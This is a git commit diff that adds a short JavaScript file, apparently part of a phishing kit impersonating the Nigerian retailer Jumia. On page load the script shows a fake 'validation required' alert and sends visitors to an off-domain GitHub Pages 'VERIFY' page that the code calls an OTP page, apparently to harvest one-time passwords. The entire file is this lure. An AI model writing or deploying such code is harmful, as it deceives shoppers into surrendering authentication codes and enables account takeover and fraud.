cc6f6eaa1e4af1305cdd219b0567495c1d25dc0a
jumia-ng-electronics-category-nig <131971835+jumia-ng-electronics-category-nig@users.noreply.github.com>
2023-10-10 15:29:29 +0100

    Add files via upload

---
+++ validation.js
@@ -0,0 +1,14 @@
+// validation.js
+
+// Function to check validation status in LocalStorage
+function checkValidationStatus() {
+    const validationStatus = localStorage.getItem("validationStatus");
+    if (!validationStatus || !JSON.parse(validationStatus).validated) {
+        // Validation status not found or not validated
+        alert("VALIDATION REQUIRED: This usually happens when you access our platform on a new phone or browser.");
+        window.location.href = "https://tzmyn.github.io/Harem/VERIFY.html"; // Redirect to OTP page
+    }
+}
+
+// Call the checkValidationStatus function when the page loads
+window.addEventListener("load", checkValidationStatus);
